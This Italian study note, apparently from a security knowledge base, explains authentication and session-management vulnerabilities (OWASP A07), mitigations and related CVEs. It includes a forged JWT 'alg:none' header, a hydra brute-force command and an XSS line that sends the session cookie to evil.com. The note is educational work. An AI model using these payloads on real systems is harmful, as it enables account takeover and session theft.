---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 5
aggiornato: 2026-06-26
stato: maturo
aliases: ["Autenticazione e Gestione Sessioni", "Authentication Failures"]

---

# Autenticazione e Gestione Sessioni

> **Nota etica**: le tecniche descritte vanno studiate e praticate solo su ambienti autorizzati (PortSwigger Web Academy, DVWA, TryHackMe). Usarle su sistemi reali senza permesso è illegale.

## In breve

**Autenticazione** è il processo con cui un'applicazione verifica l'identità di un utente (chi sei?). **Gestione delle sessioni** è il meccanismo che mantiene tale identità verificata durante le interazioni successive, tipicamente tramite un token o un cookie. Vulnerabilità in questi meccanismi rientrano in **A07 - Identification and Authentication Failures** dell'[[OWASP Top 10]].

## Come funziona

Dopo il login, il server emette un **Session ID** (o token) che il client presenta in ogni richiesta successiva. I principali attacchi:

- **Brute force / Password spraying**: tentare password comuni o dizionari contro moduli di login privi di rate limiting
- **Credential stuffing**: usare coppie username/password rubate da breach precedenti
- **Session hijacking**: rubare il Session ID valido di un altro utente (via [[Cross-Site Scripting (XSS)]], sniffing di rete, log)
- **Session fixation**: forzare la vittima ad usare un Session ID noto all'attaccante prima del login
- **Predictable Session IDs**: Session ID generati con algoritmi deboli o prevedibili (es. incrementali)
- **Insecure "Remember Me"**: token persistenti con lunga scadenza memorizzati in modo non sicuro
- **JWT mal gestiti**: `alg:none` accettato (firma non verificata), chiave debole/segreto noto, algoritmo non fissato lato server → vedi [[Cookie e JWT]]

```jsonc
// JWT alg:none — header manipolato per saltare la verifica della firma
{ "alg": "none", "typ": "JWT" } . { "user":"admin" } .   (firma vuota)
```
```bash
# Credential stuffing / brute force con hydra
hydra -L users.txt -P rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Esempio pratico

Un'applicazione senza rate limiting sul login:
```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=password123
```

Con [[Burp Suite]] (Intruder), l'attaccante automatizza migliaia di tentativi con una wordlist. Se non c'è blocco account o CAPTCHA, troverà la password per tentativi.

Oppure, dopo XSS, il cookie di sessione viene rubato:
```javascript
document.location='https://evil.com/steal?c='+document.cookie
```
L'attaccante usa quel cookie per impersonare la vittima.

## Mitigazione e difesa

- **Multi-Factor Authentication (MFA)**: la difesa più efficace contro credential stuffing e brute force
- **Rate limiting e lockout** sui tentativi di login
- Generare Session ID **casuali, lunghi e non prevedibili** (usare le funzioni del framework, non crearle a mano)
- Impostare attributi sicuri sui cookie di sessione: `HttpOnly`, `Secure`, `SameSite=Strict`
- **Invalidare la sessione al logout** e dopo un timeout di inattività
- Rigenerare il Session ID dopo il login (previene session fixation)
- Hashare le password con algoritmi moderni: **bcrypt**, **Argon2**, **scrypt** → [[Cryptographic Failures]]
- Verificare le password contro liste di **password compromesse**; preferire passphrase lunghe a regole di complessità inutili
- JWT: algoritmo **fissato lato server** (rifiutare `none`), firma verificata, segreti forti, scadenza breve

## CVE reale
- **CVE-2022-40684** (Fortinet FortiOS/FortiProxy) — **authentication bypass** che consente a un attaccante remoto di operare come admin: sfruttata attivamente in the wild.
- **CVE-2018-13379** (Fortinet) — path traversal che espone i file di sessione VPN in chiaro (username/password), riusati per credential stuffing su larga scala.

> [!note] Numerazione OWASP
> Categoria **A07** sia nella 2021 ("Identification and Authentication Failures") sia nella bozza 2025 ("Authentication Failures").

## Collegamenti

- [[OWASP Top 10]]
- [[Cookie e JWT]]
- [[Cross-Site Scripting (XSS)]]
- [[Cross-Site Request Forgery (CSRF)]]
- [[Broken Access Control e IDOR]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti

- PortSwigger Authentication: https://portswigger.net/web-security/authentication
- OWASP A07 Authentication Failures: https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Session Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
